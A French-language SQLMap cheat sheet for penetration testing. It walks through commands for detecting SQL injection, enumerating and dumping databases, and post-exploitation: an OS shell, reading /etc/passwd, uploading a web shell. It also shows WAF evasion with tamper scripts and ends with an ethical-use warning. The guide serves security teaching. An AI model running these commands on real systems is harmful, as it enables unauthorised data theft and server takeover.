# 💉 SQLMap : Le Guide Pratique

SQLMap est un outil open-source qui automatise la détection et l'exploitation des failles d'injection SQL. C'est l'outil de référence pour tout ce qui touche aux bases de données en pentest.

## 🔥 Le Workflow Essentiel : de la Faille au Dump

Le processus est presque toujours le même. Une fois que vous avez une URL avec un paramètre qui semble suspect (ex: `page.php?id=1`), le jeu commence.

```bash
# 1. Lancer le test initial
# L'option --batch répond "oui" à tout pour aller plus vite.
sqlmap -u "http://example.com/page.php?id=1" --batch

# 2. Lister les bases de données (si une faille est trouvée)
sqlmap -u "http://example.com/page.php?id=1" --dbs --batch

# 3. Lister les tables de la base de données qui vous intéresse
sqlmap -u "http://example.com/page.php?id=1" -D nom_de_la_base --tables --batch

# 4. Lister les colonnes de la table qui vous intéresse
sqlmap -u "http://example.com/page.php?id=1" -D nom_de_la_base -T nom_de_la_table --columns --batch

# 5. Dumper (extraire) les données !
sqlmap -u "http://example.com/page.php?id=1" -D nom_de_la_base -T nom_de_la_table --dump --batch
```

## 🎯 Ciblage Avancé

Parfois, une simple URL ne suffit pas.

- **Tester un formulaire (requête POST) :**
  ```bash
  sqlmap -u "http://example.com/login.php" --data="user=admin&pass=123"
  ```

- **Le plus pratique : Utiliser un fichier de requête Burp Suite.**
  1. Dans Burp, interceptez une requête (POST ou GET).
  2. Clic droit -> "Save item". Enregistrez-la dans un fichier (ex: `req.txt`).
  3. Lancez sqlmap sur ce fichier. Il s'occupera de tout (cookies, headers, etc.).
  ```bash
  sqlmap -r req.txt --batch
  ```

## 🚀 Aller Plus Loin : Options Clés

- `--level=<1-5>` : Augmente la profondeur des tests. Un `level 3` teste aussi les cookies et les `Referer`. Un `level 5` est le plus complet.
- `--risk=<1-3>` : Augmente le "risque" des payloads. Un `risk 3` peut être plus agressif.
- `--technique=<BEUST>` : Force une technique d'injection spécifique (B: Boolean, E: Error, U: Union, S: Stacked, T: Time).

```bash
# Un scan très approfondi, à lancer quand les scans de base ne trouvent rien.
sqlmap -r req.txt --level=5 --risk=3 --batch
```

## 💀 Post-Exploitation : Prendre le Contrôle du Serveur

Si l'utilisateur de la base de données a des privilèges suffisants, `sqlmap` peut devenir un outil de prise de contrôle.

| Commande | Description |
|---|---|
| `--os-shell` | Tente d'obtenir un shell interactif sur le système d'exploitation. |
| `--os-cmd="whoami"` | Exécute une seule commande système. |
| `--file-read="/etc/passwd"` | Lit un fichier sur le serveur. |
| `--file-write="shell.php" --file-dest="/var/www/html/uploads/shell.php"` | Uploade un fichier sur le serveur. |

## 🛡️ Contournement de WAF (Web Application Firewall)

Les WAF sont conçus pour bloquer les attaques SQL. `sqlmap` a des scripts de "tampering" pour obfusquer les payloads et tenter de les contourner.

```bash
# Utilise des scripts pour remplacer les espaces par des commentaires, etc.
sqlmap -r req.txt --tamper=space2comment,randomcase --batch
```
Il existe des dizaines de scripts de tamper. N'hésitez pas à en essayer plusieurs si vous êtes bloqué par un WAF.

---
> ⚠️ **USAGE ÉTHIQUE** : `sqlmap` est un outil extrêmement puissant. Son utilisation sans autorisation est illégale et peut causer des dommages irréversibles à une base de données.